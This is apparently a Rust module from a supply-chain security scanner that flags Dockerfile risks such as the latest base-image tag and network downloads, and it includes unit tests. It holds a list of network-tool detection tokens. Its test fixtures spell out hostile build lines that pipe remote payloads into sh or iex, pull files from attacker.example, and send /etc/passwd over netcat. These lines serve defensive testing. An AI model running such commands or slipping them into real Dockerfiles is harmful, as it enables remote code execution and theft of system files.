//! Dockerfile analysis: findings, capability inference, and artifact
//! relations. Compose-only logic lives in the sibling `compose` module.

use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};
use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestratorService};
use std::path::Path;

use crate::detectors::patterns::scan_command_token;
use crate::services::artifact_orchestration::manifests::strip_inline_hash_comment;

use super::image_uses_mutable_latest;

/// Tokens that, when present in a lowercased Dockerfile line, indicate the
/// build pulls something from the network at image-build time.
///
/// Tokens that need a left boundary to avoid false positives (e.g. `nc`
/// inside `func`) are prefixed with a space. All tokens are matched with
/// word-boundary awareness: a token matches when followed by whitespace,
/// a shell operator (`|`, `;`, `&`, `>`), or end-of-line. This catches
/// pipe-joined commands like `curl|sh` that lack trailing whitespace.
const DOCKERFILE_NETWORK_DOWNLOAD_TOKENS: &[&str] = &[
    "curl",
    "wget",
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
    "ncat",
    " nc",
    "fetch",
];

pub(crate) fn analyze_dockerfile(path: &Path, content: &str) -> Vec<Finding> {
    let artifact_path = path.display().to_string();
    let mut findings = Vec::new();

    for line in content.lines().map(str::trim) {
        if dockerfile_from_image(line).is_some_and(image_uses_mutable_latest) {
            findings.push(
                Finding::builder("MANIFEST_DOCKER_LATEST_TAG", ThreatCategory::SupplyChain)
                    .severity(Severity::Low)
                    .action(RecommendedAction::RequireApproval)
                    .evidence_kind(EvidenceKind::Context)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(line)
                    .reason("Docker base image uses the mutable latest tag")
                    .build(),
            );
        }
    }

    findings
}

pub(crate) fn dockerfile_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let mut has_expose = false;
    let mut has_run = false;
    let mut has_copy_or_add = false;
    let mut has_network_download = false;

    for line in content.lines() {
        let code = strip_inline_hash_comment(line.trim_start());
        let trimmed = code.to_ascii_lowercase();
        if !has_expose && dockerfile_instruction_args(&trimmed, "expose").is_some() {
            has_expose = true;
        }
        if !has_run && dockerfile_instruction_args(&trimmed, "run").is_some() {
            has_run = true;
        }
        if !has_copy_or_add
            && (dockerfile_instruction_args(&trimmed, "copy").is_some()
                || dockerfile_instruction_args(&trimmed, "add").is_some())
        {
            has_copy_or_add = true;
        }
        if !has_network_download && dockerfile_has_network_download(&trimmed) {
            has_network_download = true;
        }
        if !has_network_download && is_remote_add_instruction(&trimmed) {
            has_network_download = true;
        }
    }

    let mut capabilities = Vec::new();
    if has_expose {
        capabilities.push(ArtifactOrchestratorService::declared_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }
    if has_network_download {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }
    if has_run {
        capabilities.push(ArtifactOrchestratorService::declared_capability(
            ArtifactCapability::ProcessExecution,
        ));
    }
    if has_copy_or_add {
        capabilities.push(ArtifactOrchestratorService::declared_capability(
            ArtifactCapability::FilesystemWrite,
        ));
    }

    capabilities
}

pub(crate) fn dockerfile_relations(content: &str) -> Vec<ArtifactLink> {
    let mut links = Vec::new();
    for line in content.lines().map(str::trim) {
        let code = strip_inline_hash_comment(line);
        let lower = code.to_ascii_lowercase();
        if let Some(image) = dockerfile_from_image(code) {
            links.push(ArtifactLink {
                target: image.to_string(),
                relation: ArtifactRelation::Loads,
            });
        }
        if dockerfile_has_network_download(&lower) || is_remote_add_instruction(&lower) {
            links.push(ArtifactLink {
                target: "remote-resource".to_string(),
                relation: ArtifactRelation::Downloads,
            });
        }
    }
    links
}

fn is_remote_add_instruction(lower_line: &str) -> bool {
    dockerfile_instruction_args(lower_line, "add")
        .is_some_and(|args| args.contains("http://") || args.contains("https://"))
}

fn dockerfile_instruction_args<'a>(lower_line: &'a str, expected: &str) -> Option<&'a str> {
    let mut tokens = lower_line.split_whitespace();
    let instruction = tokens.next()?;
    if instruction != expected {
        return None;
    }
    let args = lower_line.get(instruction.len()..).unwrap_or("");
    Some(args.trim_start())
}

fn dockerfile_from_image(line: &str) -> Option<&str> {
    let mut tokens = line.split_whitespace();
    let instruction = tokens.next()?;
    if !instruction.eq_ignore_ascii_case("from") {
        return None;
    }
    tokens.find(|token| !token.starts_with("--"))
}

fn dockerfile_has_network_download(lower_line: &str) -> bool {
    DOCKERFILE_NETWORK_DOWNLOAD_TOKENS
        .iter()
        .any(|token| token_with_boundary(lower_line, token))
        || line_invokes_python_module_download(lower_line)
        || line_invokes_python_c_urllib(lower_line)
        || line_invokes_perl_lwp(lower_line)
}

fn line_invokes_python_module_download(lower_line: &str) -> bool {
    let tokens = shell_tokens(lower_line);
    for (index, token) in tokens.iter().enumerate() {
        if token_basename(token) != "python" {
            continue;
        }
        if tokens[index + 1..].windows(2).any(|window| {
            window[0] == "-m"
                && (window[1] == "urllib"
                    || window[1].starts_with("urllib.")
                    || window[1] == "http"
                    || window[1].starts_with("http."))
        }) {
            return true;
        }
    }
    false
}

fn line_invokes_python_c_urllib(lower_line: &str) -> bool {
    let tokens = shell_tokens(lower_line);
    tokens.iter().enumerate().any(|(index, token)| {
        token_basename(token) == "python"
            && tokens[index + 1..].contains(&"-c")
            && lower_line.contains("import urllib")
    })
}

fn line_invokes_perl_lwp(lower_line: &str) -> bool {
    let tokens = shell_tokens(lower_line);
    tokens.iter().enumerate().any(|(index, token)| {
        token_basename(token) == "perl"
            && tokens[index + 1..]
                .iter()
                .any(|arg| arg.starts_with("-mlwp"))
    })
}

fn shell_tokens(line: &str) -> Vec<&str> {
    line.split(|c: char| c.is_ascii_whitespace() || matches!(c, '|' | ';' | '&' | '('))
        .filter(|token| !token.is_empty())
        .collect()
}

fn token_basename(token: &str) -> &str {
    token.rsplit(['/', '\\']).next().unwrap_or(token)
}

/// Match a network-download token with word-boundary awareness.
///
/// Before the token, the preceding character (if any) must be whitespace,
/// a shell operator (`|`, `;`, `&`), or start-of-line. After the token,
/// the next character must be whitespace, a shell operator (`|`, `;`, `&`,
/// `>`), a Python module separator (`.`), or end-of-string.
///
/// The left boundary rejects substrings like `prefetch` → `fetch` and
/// `uncurl` → `curl`. The right boundary catches pipe-joined commands
/// like `curl|sh` that lack trailing whitespace. The `.` boundary catches
/// `python -m urllib.request` which is the same download vector as
/// `python -m urllib`.
fn token_with_boundary(lower_line: &str, token: &str) -> bool {
    scan_command_token(
        lower_line,
        token,
        |_, before| {
            // Tokens that start with a space (e.g. " nc") carry their own
            // left boundary. Otherwise, the character before the token
            // must be a word boundary.
            token.starts_with(' ')
                || before.is_none()
                || matches!(
                    before,
                    Some(b' ')
                        | Some(b'\t')
                        | Some(b'|')
                        | Some(b';')
                        | Some(b'&')
                        | Some(b'/')
                        | Some(b'(')
                        | Some(b'"')
                        | Some(b'\'')
                        | Some(b'`')
                )
        },
        |after| {
            after.is_empty()
                || after.starts_with(' ')
                || after.starts_with('\t')
                || after.starts_with('(')
                || after.starts_with('|')
                || after.starts_with(';')
                || after.starts_with('&')
                || after.starts_with('>')
                || after.starts_with('.')
                || after.starts_with(':')
        },
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn capability_present(caps: &[ArtifactCapabilityFact], target: ArtifactCapability) -> bool {
        caps.iter().any(|fact| fact.capability == target)
    }

    fn finding_present(findings: &[Finding], rule_id: &str) -> bool {
        findings.iter().any(|finding| finding.rule_id == rule_id)
    }

    /// Contract: an untagged Dockerfile base image resolves to mutable
    /// `latest` and must raise the same finding as `:latest`.
    #[test]
    fn analyze_dockerfile_flags_untagged_base_image() {
        let content = "FROM --platform=linux/amd64 alpine AS base\n";
        let findings = analyze_dockerfile(std::path::Path::new("/pkg/Dockerfile"), content);

        assert!(
            finding_present(&findings, "MANIFEST_DOCKER_LATEST_TAG"),
            "untagged FROM image must fire latest-tag finding; got {findings:?}",
        );
    }

    /// Contract: `scratch` and digest-pinned images do not resolve through
    /// the mutable latest tag.
    #[test]
    fn analyze_dockerfile_keeps_scratch_and_digest_pins_clean() {
        for content in [
            "FROM scratch\n",
            "FROM alpine@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
            "FROM alpine:latest@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
        ] {
            let findings = analyze_dockerfile(std::path::Path::new("/pkg/Dockerfile"), content);
            assert!(
                !finding_present(&findings, "MANIFEST_DOCKER_LATEST_TAG"),
                "{content:?} must not fire latest-tag finding; got {findings:?}",
            );
        }
    }

    /// Contract: relation inference records the actual base image token,
    /// not Dockerfile `FROM` flags or stage aliases.
    #[test]
    fn dockerfile_relations_extracts_from_image_token() {
        let content = "FROM --platform=linux/amd64 alpine:3.19 AS base\n";
        let links = dockerfile_relations(content);

        assert!(
            links.iter().any(|link| {
                matches!(link.relation, ArtifactRelation::Loads) && link.target == "alpine:3.19"
            }),
            "FROM relation must point at the image token; got {links:?}",
        );
    }

    /// Contract: an inline `# ... curl ...` comment in a Dockerfile must
    /// NOT flip `NetworkAccess` to observed. The pre-fix code only
    /// suppressed lines whose first non-whitespace char was `#`, so
    /// `RUN echo ok # curl example.com` would still match `"curl "`
    /// in the lower-cased line.
    #[test]
    fn dockerfile_capabilities_skips_curl_in_inline_comment() {
        let content = "FROM alpine:3\nRUN echo ok # was: curl https://old\n";
        let caps = dockerfile_capabilities(content);
        // declared NetworkAccess from EXPOSE etc. would still be possible,
        // but in this fixture there is no EXPOSE — so neither declared
        // nor observed NetworkAccess should be present.
        assert!(!capability_present(
            &caps,
            ArtifactCapability::NetworkAccess
        ));
    }

    /// Contract: a real `RUN curl ...` step still flips observed
    /// NetworkAccess. Pins that the inline-comment stripper does not
    /// erase the real curl preceding the `#`.
    #[test]
    fn dockerfile_capabilities_detects_real_curl_with_trailing_comment() {
        let content = "FROM alpine:3\nRUN curl https://x  # bootstrap\n";
        let caps = dockerfile_capabilities(content);
        assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
    }

    /// Contract: an inline `# ... curl ...` comment in a Dockerfile must
    /// NOT add a Downloads link. The pre-fix code suppressed only lines
    /// whose first non-whitespace char was `#`, so the trailing comment
    /// fed into `artifact_taint` and produced a spurious
    /// `ARTIFACT_TAINT_DOWNLOAD_TO_EXECUTION` Critical finding when
    /// combined with any process-execution edge in the package.
    #[test]
    fn dockerfile_relations_skips_curl_in_inline_comment() {
        let content = "FROM alpine:3\nRUN echo ok # was: curl https://gone\n";
        let links = dockerfile_relations(content);
        assert!(
            links.iter().all(|l| l.target != "remote-resource"),
            "no Downloads link should be created from an inline-comment curl; got {links:?}",
        );
    }

    /// Contract: a real `RUN curl ...` step still produces a Downloads
    /// link. Anchors that the inline-comment stripper preserves real
    /// evidence preceding the `#`.
    #[test]
    fn dockerfile_relations_detects_real_curl_with_trailing_comment() {
        let content = "FROM alpine:3\nRUN curl https://x  # bootstrap\n";
        let links = dockerfile_relations(content);
        assert!(
            links.iter().any(|l| l.target == "remote-resource"),
            "real curl invocation should produce a Downloads link; got {links:?}",
        );
    }

    /// Contract: a Dockerfile that fetches a payload via `python -m
    /// urllib.request` MUST flip the observed NetworkAccess capability.
    /// Pre-fix, only `curl`, `wget`, and `invoke-webrequest` were detected,
    /// so a `python:slim`-based image fetching with `python -m urllib.request`
    /// silently failed the capability check.
    #[test]
    fn dockerfile_capabilities_detects_python_urllib_download() {
        let content = "FROM python:3.11-slim\nRUN python -m urllib.request https://x/payload\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            has_observed_network,
            "python -m urllib must flip observed NetworkAccess; got {caps:?}",
        );
    }

    /// # Contract
    ///
    /// Multi-token Dockerfile download commands accept shell whitespace,
    /// including tabs between command, flag, and module arguments.
    #[test]
    fn dockerfile_capabilities_detects_tab_separated_multitoken_downloads() {
        for content in [
            "FROM python:3.11-slim\nRUN python\t-m\turllib.request https://x/payload\n",
            "FROM python:3.11-slim\nRUN python\t-c\t'import urllib.request'\n",
            "FROM perl:5\nRUN perl\t-MLWP::Simple -e 'getstore(...)'\n",
        ] {
            let caps = dockerfile_capabilities(content);
            let has_observed_network = caps.iter().any(|fact| {
                fact.capability == ArtifactCapability::NetworkAccess
                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
            });
            assert!(
                has_observed_network,
                "{content:?} must flip observed NetworkAccess; got {caps:?}",
            );
        }
    }

    /// # Contract (negative)
    ///
    /// Multi-token Dockerfile download command matching is command-token aware.
    #[test]
    fn dockerfile_capabilities_rejects_multitoken_command_substrings() {
        for content in [
            "FROM python:3.11-slim\nRUN mypython\t-m\turllib.request https://x/payload\n",
            "FROM python:3.11-slim\nRUN mypython\t-c\t'import urllib.request'\n",
            "FROM perl:5\nRUN helperl\t-MLWP::Simple -e 'getstore(...)'\n",
        ] {
            let caps = dockerfile_capabilities(content);
            let has_observed_network = caps.iter().any(|fact| {
                fact.capability == ArtifactCapability::NetworkAccess
                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
            });
            assert!(
                !has_observed_network,
                "{content:?} must not flip observed NetworkAccess; got {caps:?}",
            );
        }
    }

    /// Contract: BSD `fetch` and raw `nc` (netcat) are equally valid
    /// download/exfil tools and must trip the same capability gate.
    #[test]
    fn dockerfile_capabilities_detects_fetch_and_netcat() {
        let fetch = "FROM alpine\nRUN fetch -o /tmp/x https://internal/payload\n";
        let nc = "FROM alpine\nRUN nc -lvp 4444 > /tmp/x\n";
        for content in [fetch, nc] {
            let caps = dockerfile_capabilities(content);
            assert!(
                caps.iter().any(|fact| {
                    fact.capability == ArtifactCapability::NetworkAccess
                        && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
                }),
                "expected observed NetworkAccess for {content:?}; got {caps:?}",
            );
        }
    }

    /// # Contract
    ///
    /// Dockerfile download commands can be invoked through absolute paths
    /// or nested quoted command strings, and still carry observed network
    /// behavior.
    #[test]
    fn dockerfile_capabilities_detects_quoted_and_absolute_download_commands() {
        for content in [
            "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
            "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"iwr($PAYLOAD_URL) | iex\"\n",
            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"irm($PAYLOAD_URL) | iex\"\n",
        ] {
            let caps = dockerfile_capabilities(content);
            assert!(
                caps.iter().any(|fact| {
                    fact.capability == ArtifactCapability::NetworkAccess
                        && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
                }),
                "{content:?} must flip observed NetworkAccess; got {caps:?}",
            );
        }
    }

    /// Contract: Dockerfile `ADD <url> <dest>` downloads remote content at
    /// build time and must flip observed NetworkAccess.
    #[test]
    fn dockerfile_capabilities_detects_remote_add_url() {
        let content = "FROM alpine\nADD https://attacker.example/payload /tmp/payload\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            has_observed_network,
            "remote ADD URL must flip observed NetworkAccess; got {caps:?}",
        );
    }

    /// # Contract
    ///
    /// Dockerfile instructions are separated from their arguments by shell
    /// whitespace, not only ASCII spaces. Tabs after `EXPOSE`, `RUN`, `COPY`,
    /// and `ADD` must preserve the same declared capabilities.
    #[test]
    fn dockerfile_capabilities_accepts_tab_after_instruction_keyword() {
        let content = "FROM alpine\nEXPOSE\t8080\nRUN\techo ok\nCOPY\ttool /usr/bin/tool\n";
        let caps = dockerfile_capabilities(content);
        assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
        assert!(capability_present(
            &caps,
            ArtifactCapability::ProcessExecution
        ));
        assert!(capability_present(
            &caps,
            ArtifactCapability::FilesystemWrite
        ));
    }

    /// # Contract
    ///
    /// `ADD <url> <dest>` has remote-fetch semantics regardless of whether
    /// Dockerfile whitespace is a space or a tab.
    #[test]
    fn dockerfile_capabilities_detects_tab_separated_remote_add_url() {
        let content = "FROM alpine\nADD\thttps://attacker.example/payload /tmp/payload\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            has_observed_network,
            "tab-separated remote ADD URL must flip observed NetworkAccess; got {caps:?}",
        );
    }

    /// # Contract (negative)
    ///
    /// Remote-ADD detection requires the real `ADD` instruction token.
    /// Instruction-name prefixes must not satisfy Dockerfile fetch semantics.
    #[test]
    fn dockerfile_capabilities_rejects_remote_add_instruction_substrings() {
        let content = "FROM alpine\nADDRESS https://attacker.example/payload /tmp/payload\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            !has_observed_network,
            "ADD-prefix instruction must not flip observed NetworkAccess; got {caps:?}",
        );
    }

    /// Contract: tokens like `nc` MUST require explicit whitespace boundaries
    /// — a substring match against `func`, `unc`, `vncserver`, etc., would
    /// over-fire. This pins the negative case to keep the boundary logic.
    #[test]
    fn dockerfile_capabilities_does_not_overmatch_substrings_of_nc() {
        let content = "FROM alpine\nRUN apk add func unc vncserver\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            !has_observed_network,
            "substrings like func/unc/vncserver must not trip observed NetworkAccess; got {caps:?}",
        );
    }

    /// # Contract (negative)
    ///
    /// PowerShell download aliases must still require a real command token.
    #[test]
    fn dockerfile_capabilities_rejects_iwr_substrings() {
        for content in [
            "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n",
            "FROM alpine\nRUN echo confirm($PAYLOAD_URL)\n",
        ] {
            let caps = dockerfile_capabilities(content);
            let has_observed_network = caps.iter().any(|fact| {
                fact.capability == ArtifactCapability::NetworkAccess
                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
            });
            assert!(
                !has_observed_network,
                "PowerShell alias substrings must not trip observed NetworkAccess for {content:?}; got {caps:?}",
            );
        }
    }

    /// Contract: `dockerfile_relations` must record a `Downloads` edge for
    /// EVERY token in `DOCKERFILE_NETWORK_DOWNLOAD_TOKENS`, paralleling
    /// `dockerfile_capabilities`. Pre-fix only `curl `/`wget ` produced an
    /// edge, so a Dockerfile using `python -m urllib`, `nc`, `fetch`, etc.,
    /// declared NetworkAccess capability without the matching Downloads
    /// edge — and downstream composite-capability detectors that key off
    /// the edge (e.g. `ShellDownloadExec`) silently missed.
    #[test]
    fn dockerfile_relations_records_download_edge_for_python_urllib() {
        let content = "FROM alpine\nRUN python -m urllib https://attacker.example/x.py\n";
        let links = dockerfile_relations(content);
        assert!(
            links
                .iter()
                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
                    && l.target == "remote-resource"),
            "python -m urllib must produce a Downloads edge; got {links:?}",
        );
    }

    /// # Contract
    ///
    /// Dockerfile download edges mirror observed network capability detection
    /// for tab-separated multi-token download commands.
    #[test]
    fn dockerfile_relations_records_download_edge_for_tab_separated_multitoken_downloads() {
        for content in [
            "FROM python:3.11-slim\nRUN python\t-m\turllib.request https://x/payload\n",
            "FROM python:3.11-slim\nRUN python\t-c\t'import urllib.request'\n",
            "FROM perl:5\nRUN perl\t-MLWP::Simple -e 'getstore(...)'\n",
        ] {
            let links = dockerfile_relations(content);
            assert!(
                links
                    .iter()
                    .any(|link| matches!(link.relation, ArtifactRelation::Downloads)),
                "{content:?} must produce a Downloads edge; got {links:?}",
            );
        }
    }

    /// Contract: same coverage parity for `nc`/`ncat`/`fetch`/`perl -mlwp`
    /// — pre-fix the edge only fired for `curl`/`wget`. Pinning the four
    /// most common alternatives keeps the parity from regressing.
    #[test]
    fn dockerfile_relations_records_download_edge_for_alternate_tools() {
        for token in [
            "RUN nc -lvp 4444 < /etc/passwd\n",
            "RUN ncat attacker.example 4444\n",
            "RUN fetch https://attacker.example/x\n",
            "RUN perl -MLWP::Simple -e 'getstore(...)'\n",
        ] {
            let content = format!("FROM alpine\n{token}");
            let links = dockerfile_relations(&content);
            assert!(
                links
                    .iter()
                    .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                "token line `{token}` must produce a Downloads edge; got {links:?}",
            );
        }
    }

    /// # Contract
    ///
    /// Dockerfile download edges mirror observed network capability
    /// detection for absolute-path and nested quoted downloader commands.
    #[test]
    fn dockerfile_relations_records_download_edge_for_quoted_and_absolute_commands() {
        for content in [
            "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
            "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"iwr($PAYLOAD_URL) | iex\"\n",
            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"irm($PAYLOAD_URL) | iex\"\n",
        ] {
            let links = dockerfile_relations(content);
            assert!(
                links
                    .iter()
                    .any(|link| matches!(link.relation, ArtifactRelation::Downloads)),
                "{content:?} must produce a Downloads edge; got {links:?}",
            );
        }
    }

    /// # Contract (negative)
    ///
    /// Lookalike PowerShell aliases do not produce download edges.
    #[test]
    fn dockerfile_relations_rejects_iwr_substrings() {
        for content in [
            "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n",
            "FROM alpine\nRUN echo confirm($PAYLOAD_URL)\n",
        ] {
            let links = dockerfile_relations(content);
            assert!(
                !links
                    .iter()
                    .any(|link| matches!(link.relation, ArtifactRelation::Downloads)),
                "PowerShell alias substrings must not produce Downloads edges for {content:?}; got {links:?}",
            );
        }
    }

    /// Contract: `ADD <url> <dest>` must record the same Downloads edge as
    /// explicit downloader commands.
    #[test]
    fn dockerfile_relations_records_download_edge_for_remote_add_url() {
        let content = "FROM alpine\nADD https://attacker.example/payload /tmp/payload\n";
        let links = dockerfile_relations(content);
        assert!(
            links
                .iter()
                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
                    && l.target == "remote-resource"),
            "remote ADD URL must produce a Downloads edge; got {links:?}",
        );
    }

    /// # Contract
    ///
    /// `ADD <url> <dest>` must produce a Downloads edge when the instruction
    /// is separated from its URL by a tab.
    #[test]
    fn dockerfile_relations_records_download_edge_for_tab_separated_remote_add_url() {
        let content = "FROM alpine\nADD\thttps://attacker.example/payload /tmp/payload\n";
        let links = dockerfile_relations(content);
        assert!(
            links
                .iter()
                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
                    && l.target == "remote-resource"),
            "tab-separated remote ADD URL must produce a Downloads edge; got {links:?}",
        );
    }

    /// # Contract (negative)
    ///
    /// Remote-ADD relation inference requires the real `ADD` instruction
    /// token, not an instruction-name prefix.
    #[test]
    fn dockerfile_relations_rejects_remote_add_instruction_substrings() {
        let content = "FROM alpine\nADDRESS https://attacker.example/payload /tmp/payload\n";
        let links = dockerfile_relations(content);
        assert!(
            !links
                .iter()
                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
            "ADD-prefix instruction must not produce a Downloads edge; got {links:?}",
        );
    }

    /// Contract: only `ADD` has remote-fetch semantics; `COPY` with a URL-like
    /// string must not produce a Downloads edge.
    #[test]
    fn dockerfile_relations_rejects_copy_url_lookalike() {
        let content = "FROM alpine\nCOPY https://example.invalid/path /tmp/path\n";
        let links = dockerfile_relations(content);
        assert!(
            !links
                .iter()
                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
            "COPY URL-like text must not produce a Downloads edge; got {links:?}",
        );
    }

    /// Contract: regression guard for the original `curl`/`wget` coverage.
    /// The fix must NOT drop the cases that already worked.
    #[test]
    fn dockerfile_relations_still_records_curl_and_wget() {
        for token in ["RUN curl https://x\n", "RUN wget https://x\n"] {
            let content = format!("FROM alpine\n{token}");
            let links = dockerfile_relations(&content);
            assert!(
                links
                    .iter()
                    .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                "`{token}` must keep producing a Downloads edge; got {links:?}",
            );
        }
    }

    /// Contract: `dockerfile_relations` must use word-boundary-aware matching
    /// (like `dockerfile_capabilities`), not bare substring matching. Pre-fix,
    /// `lower.contains(t)` matched substrings like "prefetch" → "fetch" and
    /// "func" → "nc", producing spurious `Downloads` edges without a matching
    /// `NetworkAccess` capability.
    #[test]
    fn dockerfile_relations_does_not_overmatch_substrings() {
        for line in ["RUN prefetch npm package", "RUN apk add func unc vncserver"] {
            let content = format!("FROM alpine\n{line}\n");
            let links = dockerfile_relations(&content);
            assert!(
                !links
                    .iter()
                    .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                "substring in `{line}` must not produce a Downloads edge; got {links:?}",
            );
        }
    }
}
